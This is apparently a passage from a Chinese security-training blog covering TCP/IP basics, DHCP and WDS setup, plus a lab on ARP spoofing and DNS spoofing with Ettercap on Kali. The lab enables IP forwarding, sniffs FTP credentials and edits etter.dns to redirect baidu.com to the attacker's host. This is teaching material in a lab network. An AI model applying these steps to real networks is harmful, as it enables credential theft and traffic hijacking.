alt="img"></p><table><thead><tr><th>应用层</th></tr></thead><tbody><tr><td>HTTP（超文本传输协议 80）：用于浏览器和 Web 服务器之间的请求和响应的交互</td></tr><tr><td>DNS（域名系统 53）：用于连接 DNS 服务器</td></tr><tr><td>SMTP（简单邮件传输协议 25）：用于接收邮件</td></tr><tr><td>FTP（文件传输协议 21）：用于控制连接 FTP 服务器</td></tr><tr><td>传输层</td></tr><tr><td>TCP（传输控制协议）和 UDP（用户数据报协议）</td></tr><tr><td>网络层 (本层 TCP/IP 定义了 IP 协议，而 IP 协议又由四个支撑协议组成)</td></tr><tr><td>ARP（地址解析协议）：用于在局域网中根据 IP 地址获取物理地址</td></tr><tr><td>RARP（逆地址解析协议）：用于在局域网中通过 ARP 表根据物理地址请求 IP 地址</td></tr><tr><td>ICMP（网际控制报文协议）：用于验证网络是否畅通</td></tr><tr><td>IGMP（网际组管理协议）：用于主机与组播路由器之间组播通信</td></tr><tr><td>物理层和数据链路层</td></tr><tr><td>IEEE802.3 有线局域网（以太网）标准</td></tr><tr><td>IEEE802.11 无线局域网标准</td></tr></tbody></table><p><strong>》》》TCP 协议《《《</strong></p><p>在 TCP/IP 协议中，TCP 协议提供可靠的连接服务，采用三次握手建立一个连接.</p><p>TCP 是面向连接的通信协议，通过三次握手建立连接，通讯完成时要拆除连接，由于 TCP 是面向连接的所以只能用于端到端的通讯。TCP 提供的是一种可靠的数据流服务，采用 &quot;带重传的肯定确认&quot; 技术来实现传输的可靠性。TCP 还采用一种称为 &quot;滑动窗口&quot; 的方式进行流量控制，所谓窗口实际表示接收能力，用以限制发送方的发送速度。</p><p>建立 TCP 连接，就是指建立一个 TCP 连接时，需要客户端和服务端总共发送 3 个包以确认连接的建立。在 socket 编程中，这一过程由客户端执行 connect 来触发。</p><p><strong>注：seq</strong>:&quot;sequance&quot; 序列号；<strong>ack</strong>:&quot;acknowledge&quot; 确认号；<strong>SYN</strong>:&quot;synchronize&quot; 请求同步标志；<strong>；ACK</strong>:“acknowledge&quot; 确认标志”<strong>；FIN</strong>：&quot;Finally&quot; 结束标志。</p><p>使用 TCP 的协议：</p><ul><li><p>FTP（文件传输协议）21 号端口 20 号端口</p></li><li><p>Telnet（远程登录协议）</p></li><li><p>SMTP（简单邮件传输协议）</p></li><li><p>POP3（和 SMTP 相对，用于接收邮件）</p></li><li><p>HTTP 协议等。</p></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641818342862-a9572f54-aef6-41d3-ae56-30495c09107e.png" alt="img"></p><p><strong>第一次握手</strong>：Client 将标志位 SYN 置为 1，随机产生一个值 seq=J，并将该数据包发送给 Server，Client 进入 SYN_SENT 状态，等待 Server 确认。</p><p>SYN：同步序列编号 (Synchronize Sequence Numbers)</p><p><strong>第二次握手</strong>：Server 收到数据包后由标志位 SYN=1 知道 Client 请求建立连接，Server 将标志位 SYN 和 ACK 都置为 1，ack=J+1，随机产生一个值 seq=K，并将该数据包发送给 Client 以确认连接请求，Server 进入 SYN_RCVD 状态。</p><p><strong>第三次握手</strong>：Client 收到确认后，检查 ack 是否为 J+1，ACK 是否为 1，如果正确则将标志位 ACK 置为 1，ack=K+1，并将该数据包发送给 Server，Server 检查 ack 是否为 K+1，ACK 是否为 1，如果正确则连接建立成功，Client 和 Server 进入 ESTABLISHED 状态，完成三次握手，随后 Client 与 Server 之间可以开始传输数据了。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2336202/1641217203992-87ac02b3-a6fe-4389-917a-887fd4de1e4b.png" alt="img"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">为什么需要三次握手？</span><br><span class="line">client发出的第一个连接请求报文段并没有丢失，而是在某个网络结点长时间的滞留了，以致延误到连接释放以后的某个时间才到达server。本来这是一个早已失效的报文段。但server收到此失效的连接请求报文段后，就误认为是client再次发出的一个新的连接请求。于是就向client发出确认报文段，同意建立连接。假设不采用三次握手，那么只要server发出确认，新的连接就建立了。由于现在client并没有发出建立连接的请求，因此不会理睬server的确认，也不会向server发送数据。但server却以为新的运输连接已经建立，并一直等待client发来数据。这样，server的很多资源就白白浪费掉了。采用三次握手的办法可以防止上述现象发生。</span><br></pre></td></tr></table></figure><p>四次挥手（Four-Way Wavehand）即终止 TCP 连接，就是指断开一个 TCP 连接时，需要客户端和服务端总共发送 4 个包以确认连接的断开。在 socket 编程中，这一过程由客户端或服务端任一方执行 close 来触发…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641819982983-b25a8e05-291a-4bdc-83dd-5f9a97964972.png" alt="img"></p><p><strong>第一次挥手</strong>：Client 发送一个 FIN，用来关闭 Client 到 Server 的数据传送，Client 进入 FIN_WAIT_1 状态。</p><p><strong>第二次挥手</strong>：Server 收到 FIN 后，发送一个 ACK 给 Client，确认序号为收到序号 + 1（与 SYN 相同，一个 FIN 占用一个序号），Server 进入 CLOSE_WAIT 状态。</p><p><strong>第三次挥手</strong>：Server 发送一个 FIN，用来关闭 Server 到 Client 的数据传送，Server 进入 LAST_ACK 状态。</p><p><strong>第四次挥手</strong>：Client 收到 FIN 后，Client 进入 TIME_WAIT 状态，接着发送一个 ACK 给 Server，确认序号为收到序号 + 1， Server 进入 CLOSED 状态，完成四次挥手。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">【问题<span class="number">1</span>】为什么连接的时候是三次握手，关闭的时候却是四次握手？</span><br><span class="line">答：因为当Server端收到Client端的SYN连接请求报文后，可以直接发送SYN+ACK报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当Server端收到FIN报文时，很可能并不会立即关闭SOCKET，所以只能先回复一个ACK报文，告诉Client端，<span class="string">&quot;你发的FIN报文我收到了&quot;</span>。只有等到我Server端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送。故需要四步握手。</span><br></pre></td></tr></table></figure><p>如果有大量的连接，每次在连接、关闭时都要三次握手，四次挥手，会很明显会造成性能低下，因此，HTTP 有一种叫做 keep connection 的机制，它可以在传输数据后仍然保持连接，当客户端再次获取数据时，直接使用刚刚空闲下的连接而无需再次握手…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641820064122-1df469e4-3437-4dbb-ab08-a45a7438b2fb.png" alt="img"></p><p><strong>》》》UDP 协议《《《</strong></p><p>UDP 用户数据报协议，是面向无连接的通讯协议，UDP 数据包括目的端口号和源端口号信息，由于通讯不需要连接，所以可以实现广播发送。</p><p>UDP 通讯时不需要接收方确认，属于不可靠的传输，可能会出现丢包现象，实际应用中要求程序员编程验证。</p><p>UDP 与 TCP 位于同一层，但它不管数据包的顺序、错误或重发。因此，UDP 不被应用于那些使用虚电路的面向连接的服务，UDP 主要用于那些面向查询 — 应答的服务，例如 NFS。相对于 FTP 或 Telnet，这些服务需要交换的信息量较小。</p><p>每个 UDP 报文分 UDP 报头和 UDP 数据区两部分。报头由四个 16 位长（2 字节）字段组成，分别说明该报文的源端口、目的端口、报文长度以及校验值。UDP 报头由 4 个域组成，其中每个域各占用 2 个字节，具体如下：</p><ul><li><p>（1）源端口号；</p></li><li><p>（2）目标端口号；</p></li><li><p>（3）数据报长度；</p></li><li><p>（4）校验值。</p></li></ul><p>使用 UDP 协议包括：TFTP（简单文件传输协议）、SNMP（简单网络管理协议）、DNS（域名解析协议）、NFS、BOOTP。</p><p><strong>》》》TCP 和 UDP 的区别《《《</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>：连接方面区别：</span><br><span class="line">i：TCP面向连接（如打电话要先拨号建立连接）。</span><br><span class="line">ii：UDP是无连接的，即发送数据之前不需要建立连接。</span><br><span class="line"><span class="number">2</span>：安全方面的区别：</span><br><span class="line">i：TCP提供可靠的服务，通过TCP连接传送的数据，无差错，不丢失，不重复，且按序到达。</span><br><span class="line">ii：UDP尽最大努力交付，即不保证可靠交付。</span><br><span class="line"><span class="number">3</span>：传输效率的区别：</span><br><span class="line">i：TCP传输效率相对较低。</span><br><span class="line">ii：UDP传输效率高，适用于对高速传输和实时性有较高的通信或广播通信。</span><br><span class="line"><span class="number">4</span>：连接对象数量的区别：</span><br><span class="line">i：TCP连接只能是点到点、一对一的。</span><br><span class="line">ii：UDP支持一对一，一对多，多对一和多对多的交互通信。</span><br></pre></td></tr></table></figure><p><strong>》》》数据封装与解封装过程《《《</strong></p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641820630031-3de6d764-4c7f-4949-90bf-9a79145d217e.png" alt="img"></p><p>1. 数据封装过程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>在应用层，用户的数据被转换成二进制数据</span><br><span class="line"><span class="number">2.</span>在传输层，上层数据被分割成很小的数据段，并为每个分段后的数据封装TCP报文头部</span><br><span class="line"><span class="number">3.</span>在网络层，上层数据被封装上新的报文头部——IP头部</span><br><span class="line"><span class="number">4.</span>在数据链路层，上层数据被封装一个MAC头部，其内部有一个关键的字段信息——MAC地址</span><br><span class="line"><span class="number">5.</span>在物理层，无论在之前封装的报文头部还是上层的数据信息都是由二进制数组成的，在物理层，将这些二进制数字组成的比特流转换成电信号在网络中传输</span><br></pre></td></tr></table></figure><p>2. 数据解封装过程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">数据被封装完毕通过网络传输到接收方以后，将进入数据的解封装过程，这将是封装过程的一个逆过程</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>在物理层，首先将电信号转换成二进制数据，并将数据数据送至数据链路层</span><br><span class="line"><span class="number">2.</span>在数据链路层，查看目标MAC地址，如果吻合就“拆掉”，将剩下的数据送往上一层</span><br><span class="line"><span class="number">3.</span>在网络层，核实目标IP地址是否与自己的IP地址相同，从而确定是否送至上一层</span><br><span class="line"><span class="number">4.</span>在传输层，首先根据TCP头部判断数据送往哪个应用层协议或应用程序，将之前被分组的数据段重组，再送往上一层</span><br><span class="line"><span class="number">5.</span>在应用层，这些二进制数据将经历复杂的解码过程还原成发送者所输送的最初信息</span><br></pre></td></tr></table></figure><p><strong>》》》数据传输基本概念《《《</strong></p><ul><li><p>对于 OSI 模型而言，每一层都是通过协议数据单元来进行通信的，而对于 TCP/IP 五层模型，也可以沿用这个概念</p></li><li><p>PDU（协议数据单元）是指同层之间传递的数据单位</p></li><li><p>应用数据需要经过 TCP/IP 每一层处理之后才能传输到目的端，每一层都使用该层的协议数据单元 PDU 彼此交换信息，不同层的 PDU 中包含有不同的信息，因此 PDU 在不同层被赋予了不同的名称</p></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641821009877-48ab3553-40e2-4347-befb-2b798c79f016.png" alt="img"></p><p><strong>》》》硬件设备对应五层模型《《《</strong></p><p>设备属于哪一层要看这个设备主要工作在哪一层，有什么对应的功能…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641821153555-dd2442a2-a3f2-4745-b299-057027fc6ffe.png" alt="img"></p><p><strong>》》》层间通信协议《《《</strong></p><ul><li>发送方与接收方之间必须采用相同的协议才能建立连接，实现正常的通信</li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641821484028-605bd9f5-59d2-4767-baa4-0f9a01a6cec4.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提问:各个层的协议都有哪些？</span><br></pre></td></tr></table></figure><h1 id="三局域网络攻击实验扩展"><a class="markdownIt-Anchor" href="#三局域网络攻击实验扩展">#</a> 三：局域网络攻击实验【扩展】</h1><p><strong>》》》ARP 欺骗攻击《《《</strong></p><p>简介：ARP（Address Resolution Protocol）是地址解析协议，是一种将 IP 地址转化成物理地址的协议。从 IP 地址到物理地址的映射有两种方式：表格方式和非表格方式。ARP 具体说来就是将网络层（也就是相当于 OSI 的第三层）地址解析为数据链路层（也就是相当于 OSI 的第二层）的物理地址 (注：此处物理地址并不一定指 MAC 地址)。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原理：主机A要向主机B发送报文，会查询A本地的ARP缓存表，找到B的IP地址对应的MAC地址后，就会进行数据传输。如果未找到，则A广播一个ARP请求报文（携带主机A的IP地址Ia——物理地址Pa），请求IP地址为Ib的主机B回答物理地址Pb。网上所有主机包括B都收到ARP请求，但只有主机B识别自己的IP地址，于是向A主机发回一个ARP响应报文。其中就包含有B的MAC地址，A接收到B的应答后，就会更新本地的ARP缓存。接着使用这个MAC地址发送数据（由网卡附加MAC地址）。因此，本地高速缓存的这个ARP表是本地网络流通的基础，而且这个缓存是动态的。</span><br></pre></td></tr></table></figure><p>实验网络拓扑：</p><table><thead><tr><th>主机标识</th><th>安装服务</th><th>操作系统</th><th>IP 地址</th></tr></thead><tbody><tr><td>Clinet IP</td><td>None</td><td>Windows 10</td><td>192.168.1.106</td></tr><tr><td>Kali IP</td><td>None</td><td>Kali Linux</td><td>192.168.1.104</td></tr><tr><td>Server IP</td><td>FTP Server</td><td>Windows server 2016</td><td>192.168.1.98</td></tr></tbody></table><p>步骤一：在各个主机之间进行 Ping 测试，并在 Kali 上启动网卡位混杂模式…</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">1</span> &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p>步骤二：在 KALI 上输入 <code>Ettercap -G</code>  命令启动 Ettercap 图形化界面… 并进行以下操作…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641898634363-a778df2e-fc03-48f0-9140-1252820e876c.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641898677187-d9ddc981-16f0-4b39-8557-25162077abfc.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641980212733-a0d0cd5d-26ef-4cec-803a-b879714062cd.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641980247132-968383b8-4339-4b78-86db-6206bcfa2be7.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641980272363-075883c2-6a9a-4bbf-8475-e9fb1cfb7556.png" alt="img"></p><p>步骤三：在 Client 上输入以下地址进行访问，并输入 FTP 服务器账号密码进行访问…</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp:<span class="comment">//192.168.1.98/</span></span><br></pre></td></tr></table></figure><p>步骤四：回到 Kali 的 Ettercap 查看捕获到的信息…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641898515785-2cdf0138-381f-49bb-bcb9-ba2040fa7eb6.png" alt="img"></p><p><strong>》》》DNS 欺骗攻击《《《</strong></p><p>步骤一：进行欺骗之前需要对 ettercap 的 dns 文件进行编辑并添加一下内容… 注意添加的内容之前能有 &quot;#&quot; 号键…</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get install leafpad</span><br><span class="line">leafpad /etc/ettercap/etter.dns</span><br><span class="line">添加以下内容：</span><br><span class="line">baidu.com    A      Kali IP地址</span><br><span class="line">*.baidu.com    A      Kali IP地址</span><br><span class="line">这样的目的是为了，让客户端访问baidu.com时跳转访问攻击者的web服务</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641980949136-8d38ae1b-67ea-4b4e-a426-b21c1204e802.png" alt="img"></p><p>步骤二：前面的步骤与 ARP 欺骗一致，只需要在开始欺骗之前，双击添加一个插件；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641981354751-b21119ce-a158-4f62-996c-2c3f6c709cfd.png" alt="img"></p><p>步骤三：在受害者主机进行 ping 命令测试，查看 DNS 是否欺骗成功…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641980701483-03d45356-1ca6-4ad6-bece-71d5070c3c76.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第二天计算机网络&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#第二天计算机网络&quot;&gt;#&lt;/a&gt; 第二天：计算机网络&lt;/h1&gt;
&lt;p&gt;》》》昨日复习《《《&lt;/p&gt;
&lt;p&gt;》》》课前实验《《《&lt;/p&gt;
&lt;figure class=&quot;high</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/01/19/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%BA%8C%E5%91%A8/2.3DHCP%E4%B8%8EWDS%E6%9C%8D%E5%8A%A1/"/>
    <id>https://sun-spots.github.io/2022/01/19/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%BA%8C%E5%91%A8/2.3DHCP%E4%B8%8EWDS%E6%9C%8D%E5%8A%A1/</id>
    <published>2022-01-19T10:06:07.765Z</published>
    <updated>2022-01-19T10:26:21.208Z</updated>
    
    <content type="html"><![CDATA[<p><strong>第三天：DHCP 与 WDS 服务</strong></p><h1 id="一dhcp服务"><a class="markdownIt-Anchor" href="#一dhcp服务">#</a> 一：DHCP 服务</h1><p><img data-src="C:/Users/riyun/AppData/Roaming/Typora/typora-user-images/image-20220119182615780.png" alt="image-20220119182615780"></p><p>动态主机设置协定（Dynamic Host Configuration Protocol, DHCP）DHCP 是一个局域网的网络协议，使用 UDP 协议工作，其前身是 BOOTP 协议。当前的 DHCP 定义可以在 RFC 2131 中找到，而基于 IPv6 的建议标准（DHCPv6）可以在 RFC 3315 中找到。主要有两个用途：</p><ul><li>给内部网络或网络服务供应商自动分配 IP 地址给用户    #自动给当前网络分配 IP 地址信息</li><li>给内部网络管理员作为对所有电脑作中央管理的手段   #更有效的管理 IP 地址资源</li></ul><p>&gt;&gt;&gt; 工作原理 &lt;&lt;&lt;</p><p>动态主机设置协定（DHCP）是一种使网络管理员能够集中管理和自动分配 IP 网络地址的通信协议。在 IP 网络中，每个连接 Internet 的设备都需要分配唯一的 IP 地址。DHCP 使网络管理员能从中心结点监控和分配 IP 地址。当某台计算机移到网络中的其它位置时，能自动收到新的 IP 地址。</p><p>DHCP 使用了租约的概念，或称为计算机 IP 地址的有效期。租用时间是不定的，主要取决于用户在某地联接 Internet 需要多久，这对于教育行业和其它用户频繁改变的环境是很实用的。通过较短的租期，DHCP 能够在一个计算机比可用 IP 地址多的环境中动态地重新配置网络。</p><h3 id="11dhcp服务搭建"><a class="markdownIt-Anchor" href="#11dhcp服务搭建">#</a> 1.1：DHCP 服务搭建</h3><p>步骤一：在 Windows server 2012R2 中设置好静态 IP 地址并将网卡链接模式设置为仅主机模式 (不开启 DHCP 服务)…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626179278819-41f3675e-e721-4548-a37c-3d7e49ffa0cd.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626180280643-161d90a1-b487-4ef9-a74d-df4537e5ea16.png" alt="img"></p><p>步骤二：打开服务器管理器开始安装服务–&gt; 添加角色和功能–&gt; 并到选择服务器角色选择 DHCP 服务并进行安装</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626179496360-891da956-33fa-41a4-865d-68ba7d27fb6d.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626179655842-e08aec28-baaf-441d-883e-1463a8ecfe2c.png" alt="img"></p><p>步骤二：在服务器管理器面板中–&gt; 工具–&gt;DHCP–&gt; 打开 DHCP 控制界面进行配置…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626179739856-39e8dcf5-930b-4f22-9fff-5e60c370e9d1.png" alt="img"></p><h3 id="12dhcp服务应用"><a class="markdownIt-Anchor" href="#12dhcp服务应用">#</a> 1.2：DHCP 服务应用</h3><table><thead><tr><th>角色</th><th>操作系统</th><th>IP 获取地址方式</th></tr></thead><tbody><tr><td>DHCP 服务器</td><td>Windows server 2012R2</td><td>192.168.0.40</td></tr><tr><td>客户端验证</td><td>Windows 7</td><td>动态获取</td></tr></tbody></table><p>步骤一：打开 DHCP 控制台界面，在当前服务器下方的 IPV4 下右键选择新建作用域填写相对应的信息…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626179867263-0908032c-ed96-4ad4-aaac-07255bf38c34.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626179940676-773239e2-d59c-47a7-b682-bfbf600667d3.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626179979281-6e8303a1-70b1-41d9-b770-6de7300159d2.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626180060577-8c9afff4-4715-4d96-9be7-3b30f1a1610c.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626180074023-13175fc2-2c76-4c4f-b658-3abd1a7cfa31.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626180083149-ae195ca4-a94c-4636-a8d8-169420f555a8.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626180102296-f71a2d23-a223-40b4-b40d-9eadfce532f2.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626180115888-3a7c3b1e-9672-4f1b-8e84-279caf190652.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626180130359-fa6c7cef-a4db-4379-bbaf-b6f04648eb15.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626180141597-d2eae850-9672-4a37-9597-28dfc2e15e0b.png" alt="img"></p><p>步骤二：打开 windows7 客户端操作以下 CMD 命令进行 IP 地址获取…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /release  //释放DHCP获取的IP地址 </span><br><span class="line">ipconfig /renew    //重新获取IP地址</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626180378605-546baefd-f9b3-4b0f-a966-ea9e627401d4.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626180396284-3b3971d7-e52d-4722-be8a-4c44cc233855.png" alt="img"></p><h3 id="13配置故障转移"><a class="markdownIt-Anchor" href="#13配置故障转移">#</a> 1.3：配置故障转移</h3><p>步骤一：准备另外一台 Windows server 2012R2 服务器并按照 1.1 的搭建好 DHCP 服务…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626182440360-26a19bcb-928d-401e-a510-f08a32f4d31f.png" alt="img"></p><p>步骤二：在主服务器上打开 DHCP 的控制端并在作用域右键–&gt; 配置故障转移集群并填写相关信息…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626180880056-6685173e-0039-4189-83f1-237a9d2b74bf.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626180970304-5cc10dfb-9a98-44c2-a4be-1197ab46ce8d.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626182532870-44cf021b-3e57-49bb-9dea-7166038195f7.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626182548886-f0c6f9f2-c8a5-4878-92f3-16efbcb2888c.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626182602087-9d507089-5e09-43c3-aa00-513576dee2ee.png" alt="img"></p><p>步骤三：来到备用的服务器 DHCP 控制台中查看相关信息发现已经同步成功… 并且 DOWN 主服务器备用服务器还能够继续提供 DHCP 服务…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626182735398-0c712a8d-b117-480f-9bf7-dfc5113f7f87.png" alt="img"></p><h3 id="14指定主机保留地址"><a class="markdownIt-Anchor" href="#14指定主机保留地址">#</a> 1.4：指定主机保留地址</h3><p>DHCP 服务器设置 IP 保留地址。 在网络中，有些特殊计算机需要每次都获得相同的 IP 地址，这需要利用 DHCP 服务器的 “保留” 功能，将特定的 IP 地址与客户端计算机进行绑定，使该 DHCP 客户端每次向 DHCP 服务器请求时，都会获得同一个 IP 地址。</p><p>步骤一：在 Win7 中使用 ipconfig /all 命令查看 MAC 地址…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626184041868-7e8d80bd-fb94-4efd-8215-ee6dce6a9073.png" alt="img"></p><p>步骤二：在 DHCP 控制界面作用域下–&gt; 保留右键新建保留–&gt; 将要 MAC 地址要绑定的信息写入并添加…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626184200855-2b4869c3-ec2d-4464-bc41-a645ca295819.png" alt="img"></p><p>步骤三：Win7 客户机使用一下命令重新获取 IP 地址发现还是 192.168.0.150</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /release  //释放DHCP获取的IP地址 </span><br><span class="line">ipconfig /renew    //重新获取IP地址</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626184324793-5ea16baa-c6c6-44d4-b91b-d29268ea65d1.png" alt="img"></p><h1 id="二wds服务"><a class="markdownIt-Anchor" href="#二wds服务">#</a> 二：WDS 服务</h1><p>预启动执行环境（Preboot eXecution Environment，PXE）也被称为预执行环境，提供了一种使用网络接口（Network Interface）启动计算机的机制。这种机制让计算机的启动可以不依赖本地数据存储设备（如硬盘）或本地已安装的操作系统。</p><p>Windows 部署服务 Windows Deployment Services 缩写，中文意思是 Windows 部署服务。WDS 适用于大中型企业部署大批量新计算机和重装客户端，通过 WDS 来管理多版本映像以及无人参与安装脚本，并提供人工参与安装和无人参与安装的选项。</p><p>&gt;&gt;&gt;WDS 的作用 &lt;&lt;&lt;</p><p>场景一：</p><p>你现在有 1 台电脑需要装系统，那么很简单，你拿上一个 U 盘安装盘插在这台电脑上，然后从 U 盘启动，之后就可以手动安装系统了；但如果你现在有 100 台电脑，如果你在拿着一个 U 盘安装盘一台台安装，那效率肯定是太低了，这个时候 PXE 就派上用场了。</p><p>场景二：</p><p>某公司对信息安全要求比较高，需要使用无盘系统（系统不在本地电脑上，而在公司特定的服务器上），这个时候也需要使用 PXE。</p><p>场景三：</p><p>你想要一台远程的电脑运行你手上特定的系统，这个时候你就可以在本地布置一个你手上的系统，然后通过 PXE 启动你本地的系统（这个可能需要额外的支持，比如 BMC，因为要远程）。</p><p>&gt;&gt;&gt;WDS 启动原理 &lt;&lt;&lt;</p><p>当计算机引导时，<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9CSU9T">BIOS</span> 把 PXE Client 调入内存中执行，然后由 PXE <span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9DbGllbnQ=">Client</span> 将放置在远端的文件通过网络下载到本地运行。</p><p>&gt;&gt;&gt;PXE 装机优点 &lt;&lt;&lt;</p><table><thead><tr><th>规模化</th><th>同时配置多台服务器</th></tr></thead><tbody><tr><td>自动化</td><td>安装系统，配置各种服务</td></tr><tr><td>远程实现</td><td>不需要光盘、U 盘等安装介质</td></tr></tbody></table><p><img data-src="https://cdn.nlark.com/yuque/0/2021/jpeg/2699750/1626224524855-96b852aa-a781-4c2e-be85-44250a923273.jpeg" alt="img"></p><p>&gt;&gt;&gt; 部署 WDS 需要环境 &lt;&lt;&lt;</p><p>AD 域服务器的安装：活动目录服务，主要用于用户的身份验证</p><p>DNS 服务器安装：域名解析服务，主要用于查找域控制器和名称的解析服务</p><p>DHCP 服务器的安装：用于向需要安装操作系统的客户机分配 IP 地址</p><p>WDS 服务安装 注：加载部署的系统镜像</p><p>&gt;&gt;&gt;WDS 部署系统自动化安装流程 &lt;&lt;&lt;</p><ol><li><p>拥有 PXE 兼容网卡的计算机启动，并进入网络引导模式</p></li><li><p>获取 DHCP 服务器分配的 IP 地址</p></li><li><p>查找 WDS 服务器</p></li><li><p>WDS 检查客户端是否拥有授权，检查多播传输设置</p></li><li><p>开始部署</p></li></ol><table><thead><tr><th>操作系统</th><th>安装服务</th><th>作用定位</th></tr></thead><tbody><tr><td>Windows server 2012 